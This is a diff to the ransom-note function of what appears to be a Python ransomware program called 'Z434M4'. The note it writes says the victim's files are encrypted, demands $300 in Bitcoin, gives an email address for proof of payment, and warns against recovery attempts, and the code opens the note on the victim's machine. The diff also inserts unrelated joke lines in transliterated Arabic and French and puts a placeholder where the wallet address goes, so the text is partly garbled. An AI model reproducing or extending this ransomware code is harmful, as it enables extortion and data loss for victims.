@@ -159,13 +159,19 @@ def create_ransom_note():
         
         with open(note_path, "w") as f:
             f.write("""
-YOUR FILES HAVE BEEN ENCRYPTED!
+Assalamu alaykom w rahmatullahi wabarakatuuuh
+ana lesa sa7y mel noooooooooom 7alan balan falan
 
 All your files have been encrypted with a strong algorithm.
+
+que ce qu'ilya da labwa7 kol she2 moba7
+
 To decrypt your files, you need the private key which only we possess.
 
+5od el na7o 3shan menak nrta7o
+
 To get your files back, send $300 in Bitcoin to the following address:
-[BTC ADDRESS]
+[5_40_train]
 
 After payment, send proof of transfer and your personal ID to:
 z434m4.mohamedmahrous@gmail.com
@@ -177,7 +183,7 @@ DO NOT attempt to decrypt files yourself or use third-party software.
 This will permanently damage your files.
 DO NOT rename encrypted files.
 DO NOT delete the Z434M4 program or any related files.
-            """.format(machine_id))
+""".format(machine_id))
             
         # Make ransom note visible by opening it
         os.startfile(note_path)
